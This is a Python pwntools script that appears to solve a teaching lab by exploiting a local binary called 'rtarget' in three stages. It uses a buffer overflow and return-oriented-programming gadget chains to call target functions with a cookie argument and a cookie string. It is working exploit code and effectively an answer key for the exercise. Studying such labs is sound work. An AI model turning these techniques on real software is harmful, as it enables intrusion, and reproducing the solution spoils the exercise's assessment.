from pwn import *

def set_p64(addr):
    return p64(addr).decode("iso-8859-1")

context.clear(arch="amd64")

cookie = 0x59b997fa
touch1 = 0x4017c4
touch2 = 0x4017f0
touch3 = 0x4018fb

rtarget = ["./rtarget", "-q"]

# touch 1
p = process(rtarget)
input("# touch1")

junk_size = 0x28
junk = "a" * 0x28

payload = junk + set_p64(touch1)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 2
p = process(rtarget)
input("# touch2")

pop_rdi_ret = 0x000000000040141b # : pop rdi ; ret
payload = junk + set_p64(pop_rdi_ret) + set_p64(cookie) + set_p64(touch2)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 3
p = process(rtarget)
input("# touch3")


# 0x0000000000401a06 : mov rax, rsp ; ret
# 0x00000000004019ed : leave ; ret
# 0x0000000000400ef5 : pop rbp ; ret
# pop rax ret
# pop rdi ret
# mov qword ptr [rdi + 8] rax ret
# pop rdi ret

pop_rax_ret = 0x00000000004019ab # : pop rax ; nop ; ret
mov_rdi_rax_ret = 0x000000000040214d # : mov qword ptr [rdi + 8], rax ; ret
data = 0x00605000
cookie_str_addr = data + 0x500
cookie_str = "59b997fa"

payload = junk + \
            set_p64(pop_rax_ret) + cookie_str + \
            set_p64(pop_rdi_ret) + set_p64(cookie_str_addr - 8) + \
            set_p64(mov_rdi_rax_ret) + \
            set_p64(pop_rdi_ret) + set_p64(cookie_str_addr) + \
            set_p64(pop_rax_ret) + set_p64(0) + \
            set_p64(mov_rdi_rax_ret) + \
            set_p64(touch3)

p.sendline(payload)
print(str(p.recv(), "ascii"))
